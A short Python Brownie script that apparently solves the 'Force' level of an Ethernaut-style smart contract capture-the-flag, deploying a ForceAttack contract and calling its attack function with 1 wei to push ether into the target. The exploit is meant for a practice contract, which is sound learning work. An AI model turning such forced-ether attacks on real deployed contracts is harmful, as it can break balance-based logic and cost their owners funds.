from brownie import Force, ForceAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

from eth_utils import function_signature_to_4byte_selector

LEVEL_NAME = "07_force"
INTERFACE_CONTRACT = Force


def solve_level(level_contract):
    account = get_account()
    force_attack = ForceAttack.deploy({"from": account})
    tx = force_attack.attack(level_contract.address, {"from": account, "value": 1})
    tx.wait(1)


# brownie run scripts/_07_force.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
